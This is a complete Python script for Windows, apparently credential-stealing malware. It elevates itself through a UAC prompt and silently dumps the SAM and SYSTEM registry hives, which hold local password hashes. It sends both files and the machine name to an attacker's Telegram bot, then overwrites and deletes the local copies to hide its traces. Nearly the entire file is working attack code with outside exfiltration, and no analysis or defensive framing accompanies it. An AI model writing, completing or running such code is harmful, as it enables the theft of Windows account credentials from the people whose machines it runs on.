import ctypes
import sys
import os
import subprocess
import requests

BOT_TOKEN = "BOT ID"  
CHAT_ID   = "ID"


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def relaunch_as_admin():
    try:
        if getattr(sys, "frozen", False):
            exe = sys.executable
            params = ""
        else:
            exe = sys.executable
            params = " ".join(f'"{a}"' for a in sys.argv)

        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe, params, None, 1
        )
        return rc > 32
    except Exception:
        return False



desktop = os.path.join(
    os.environ.get("USERPROFILE", os.path.expanduser("~")), "Desktop"
)
sam_file    = os.path.join(desktop, "sam.save")
system_file = os.path.join(desktop, "system.save")


def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        r = requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=30)
        return r.ok
    except Exception:
        return False


def send_file(path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(path, "rb") as f:
            r = requests.post(
                url,
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"document": (os.path.basename(path), f)},
                timeout=180
            )
        return r.ok
    except Exception:
        return False



def save_hives():
    CREATE_NO_WINDOW = 0x08000000
    try:
        for hive, path in (("SAM", sam_file), ("SYSTEM", system_file)):
            if os.path.exists(path):
                try:
                    os.remove(path)
                except Exception:
                    pass
            r = subprocess.run(
                ['reg', 'save', f'HKLM\\{hive}', path, '/y'],
                capture_output=True, text=True,
                creationflags=CREATE_NO_WINDOW
            )
            if r.returncode != 0:
                return False
        return True
    except Exception:
        return False


# УНИЧТОЖЕНИЕ 
def shred(path):
    try:
        if not os.path.exists(path):
            return
        size = os.path.getsize(path)
        with open(path, "r+b") as f:
            f.write(b"\x00" * size)
            f.flush()
            os.fsync(f.fileno())
        os.remove(path)
    except Exception:
        pass



def main():
    if not is_admin():
        relaunch_as_admin()
        sys.exit(0)

    ok_sam = ok_sys = False
    try:
        if not save_hives():
            send_message(f"reg save FAILED on {os.environ.get('COMPUTERNAME','?')}")
            return

        for p in (sam_file, system_file):
            if not os.path.exists(p) or os.path.getsize(p) == 0:
                send_message(f"file missing/empty: {os.path.basename(p)}")
                return

        host = os.environ.get("COMPUTERNAME", "unknown")
        send_message(f"SAM + SYSTEM с машины: {host}")

        ok_sam = send_file(sam_file,    "SAM файл")
        ok_sys = send_file(system_file, "SYSTEM файл")

    except Exception:
        pass
    finally:
        shred(sam_file)
        shred(system_file)


if __name__ == "__main__":
    main()